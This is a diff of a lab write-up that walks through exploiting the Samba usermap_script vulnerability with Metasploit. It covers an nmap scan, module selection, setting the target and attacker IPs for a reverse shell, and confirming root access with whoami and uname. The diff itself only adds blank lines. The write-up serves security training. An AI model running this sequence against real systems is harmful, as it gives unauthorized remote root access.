@@ -28,8 +28,10 @@ The objective of this lab is to identify and exploit an SMB (Server Message Bloc
 Command:
 
 nmap -sV 192.168.X.X
+
 Explaination:
 The Nmap is used to identify open ports and running services on the target machine.
+
 Results:
 Port 139/tcp open (NetBIOS)
 Port 445/tcp open (SMB)
@@ -39,6 +41,7 @@ Service detected: samba
 Command:
 
 msfconsole
+
 Explaination: 
 Metasploit Framework is used to search, configure, and execute exploits.
 
@@ -46,6 +49,7 @@ Metasploit Framework is used to search, configure, and execute exploits.
 Command:
 
 search usermap
+
 Explaination:
 Searches for available exploits related to samba vulnerabilities.
 Results:
@@ -55,6 +59,7 @@ Found: exploit/multi/samba/usermap_script
 Command:
 
 use exploit/multi/samba/usermap_script
+
 Explaination:
 This modules exploits a vulnerability in samba that allows remote command execution.
 
@@ -62,6 +67,7 @@ This modules exploits a vulnerability in samba that allows remote command execut
 command:
 
 set RHOSTS 192.168.X.X
+
 Explaination: 
 RHOSTS specifies the target machines IP address
 
@@ -69,6 +75,7 @@ RHOSTS specifies the target machines IP address
 Command:
 
 set LHOST 192.168.X.X
+
 Explaination: 
 LHOST is the attackers IP address where the reverse connection will be established.
 
@@ -76,6 +83,7 @@ LHOST is the attackers IP address where the reverse connection will be establish
 Command:
 
 run
+
 Explaination:
 Executes the exploit against the target system.
 Results:
@@ -85,6 +93,7 @@ Command shell session opened
 Command:
 
 whoami
+
 Explaination:
 Confirms access level on the target system.
 Results:
@@ -94,6 +103,7 @@ root access obtained.
 Command:
 
 uname -a 
+
 Explaination:
 Displays system information of the compromised machine.
 Result:
